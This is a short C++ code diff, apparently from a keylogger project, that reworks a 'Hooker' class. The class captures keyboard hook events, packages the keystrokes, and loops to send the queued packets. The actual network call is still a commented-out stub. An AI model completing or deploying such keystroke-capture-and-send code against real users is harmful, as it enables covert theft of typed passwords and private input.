@@ -68,19 +68,18 @@ void Hooker::receiveCallback(int nCode, WPARAM wParam, LPARAM lParam, bool isMou
 		std::cout << "KB INPUT " << nCode << "  " << wParam << "  " << ((KBDLLHOOKSTRUCT *)lParam)->vkCode << std::endl;
 		_packager.addKey(nCode, wParam, lParam);
 	}
-	sendPaquet(_packager.getPaquet());
+	sendPaquet();
 }
 
-void Hooker::sendPaquet(Paquet* paquet) {
-	bool paquetSent = false;
+void Hooker::sendPaquet() {
+	bool paquetSent = true;
 
-	// TODO: Check if other paquets need to be sent
-	if (paquet) {
-		// SEND PAQUET OVER NETWORK
+	// TODO: check if network is reachable
+	while (_packager.isLeft() && paquetSent) {
+		// paquetSent = _network.?(_packager.getPaquet());
 		if (paquetSent)
 			_packager.supprPaquet();
 	}
-
 }
 
 bool Hooker::connect() {
